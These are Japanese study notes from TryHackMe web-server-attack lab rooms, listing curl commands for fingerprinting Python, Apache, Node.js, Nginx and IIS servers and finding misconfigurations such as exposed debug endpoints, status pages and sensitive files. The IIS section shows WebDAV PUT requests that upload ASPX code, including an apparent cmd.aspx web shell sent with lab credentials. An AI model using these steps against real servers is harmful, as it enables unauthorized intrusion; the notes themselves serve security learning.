# Webサーバーの設定ミス

https://tryhackme.com/room/webserverattacks

## サーバーの識別

Server、X-Powered-Byヘッダーなどを見る

```sh
curl -sI http://example.thm
```

存在しないページをリクエストしたとき、

- Pythonはプレーンテキストで応答
- NginxはHTMLフッターにバージョン情報
- Apacheはページ本文にサーバー名

## Python (SimpleHTTP)

開発者が `python -m http.server` でファイル共有して、そのままプロセスが残っている場合がありうる。`.env` なども含めてすべてのファイルが参照可能になる。

## Apache

### Options +Indexes ディレクティブ

ディレクトリの一覧が表示できる状態。

### mod_status

/server-status ページがlocalhost以外から参照できる状態。

### リンクされていない機密ファイル

.bak ファイルや、.htpasswd ファイルが見つかる状態。

## Node.js

### フィンガープリント

多くのExpressアプリケーションのルートパスは、JSONステータスレスポンスを返す。

```sh
curl -s http://10.144.179.127:3000
{"status":"ok","app":"company-portal","version":"1.2.0"}
```

### スタックトレース

NODE_ENV に production が設定されている場合はスタックトレースが抑制されるが、開発者が独自のエラーハンドラを作成している場合、設定にかかわらずスタックトレースが表示される可能性がある。

### デバッグエンドポイントの削除忘れ

#### Routeの列挙

```sh
curl -s http://10.144.179.127:3000/api/routes
[{"method":"GET","path":"/"},{"method":"GET","path":"/api/users"},{"method":"GET","path":"/api/routes"},{"method":"GET","path":"/api/debug/env"}]
```

#### 環境変数の暴露

```sh
curl -s http://10.144.179.127:3000/api/debug/env
{"NODE_ENV":"development","DB_PASSWORD":"NodeDBPass2024!","PORT":"3000","DB_HOST":"localhost:5432","APP_NAME":"company-portal"}r
```

### staticファイルの配信

静的ファイルルートが存在する場合、そのルートはディレクトリ内のすべてのファイルを配信する（ただし、ドットから始まるファイル名はサイレントに404を返す）。  
configファイルはブラウザが必要とするため公開されることが前提になっている。

```sh
curl -s http://10.144.179.127:3000/static/config.js
```

## Nginx

本番環境では、Nginxはプロキシロードバランサーや高性能な静的ファイルサーバーなどとして機能することが多い。

### server_tokens ディレクティブ

これをOFFにすると、デフォルトエラーページと、Serverヘッダーのバージョン文字列の両方を同時に抑制する。  
つまり、Serverヘッダーが抑制されている場合、存在しないパスを要求したときにバージョン文字列が表示されなければ、server_tokens ディレクティブにより抑制されていると考えることができる。

### ディレクトリ一覧

nginxではデフォルトでディレクトリ一覧が無効になっている。有効にするには下記のように autoindex を on に設定する必要がある。

```
location /files/ {
    autoindex on;
    root /var/www/nginx/;
}
```

### nginx_status エンドポイント

localhostのみに設定すべき部分。

```
location /nginx_status {
    stub_status;
    allow all;  # Should be: allow 127.0.0.1; deny all;
}
```

直接悪用できるものではないが、サーバーの負荷や使用パターンに関する運用情報が漏洩する可能性がある。

```sh
curl -s http://10.144.179.127:8080/nginx_status
Active connections: 1 
server accepts handled requests
 15 15 15 
Reading: 0 Writing: 1 Waiting: 0
```

## IIS

https://tryhackme.com/room/webserverattacks2

IIS/6.0 (Windows Server 2003) には [CVE-2017-7269](https://www.exploit-db.com/exploits/41992) の脆弱性があり、これに対する公式パッチはない。

### WebDAV

```sh
# DAV:が表示される場合は WebDAV が有効になっている
$ curl -X OPTIONS http://10.144.158.169/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
< DAV: 1,2,3

# 書き込みを試す
$ curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.144.158.169/webdav/test.aspx

# 認証情報を使う
$ curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.144.158.169/webdav/cmd.aspx
```

### 8.3 ショートファイル名

NTFSではデフォルトで、長いファイル名のファイルに対して、先頭の6文字に ~1 (衝突する場合は ~2, ~3) を付けた別名を生成する。  
例えば `BackupFiles/` というディレクトリが存在するとき、`BACKUP~1/` のリクエストに対して404が返されるが、でたらめなパスの場合の404と本文長が異なることにより隠れたディレクトリが存在することを推測できる。

### 機密ファイル漏洩

```sh
curl http://10.144.158.169/web.config

curl http://10.144.158.169/trace.axd
```

## サーバー共通の設定ミス

### セキュリティヘッダー

最も一般的なヘッダー

| ヘッダ                         | 保護対象                                        | 例                               |
| --------------------------- | ------------------------------------------- | --------------------------------- |
| `X-Frame-Options`           | クリックジャッキング（ページが別ドメインの `iframe` に埋め込まれるのを防ぐ） | `DENY` または `SAMEORIGIN`           |
| `X-Content-Type-Options`    | MIMEスニッフィング（ブラウザによるコンテンツタイプ推測を防ぐ）           | `nosniff`                         |
| `Content-Security-Policy`   | スクリプト、スタイルシート、その他リソースの読み込み元を制限する            | `default-src 'self'`              |
| `Referrer-Policy`           | 別ページへ移動する際、`Referer` ヘッダに含める情報を制御する         | `no-referrer` または `strict-origin` |
| `Strict-Transport-Security` | 以降のリクエストでHTTPS通信を強制する（HTTPSサーバーでのみ有効）       | `max-age=31536000`                |

`X-Frame-Options` は技術的には `Content-Security-Policy: frame-ancestors` に取って代わられているので、確認するときは両方を確認する。

検出の例

```sh
for port in 80 8000 3000 8080; do echo "=== Port $port ==="; curl -sI http://10.144.179.127:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|strict-transport|referrer-policy" || echo "(no security headers found)"; done
```
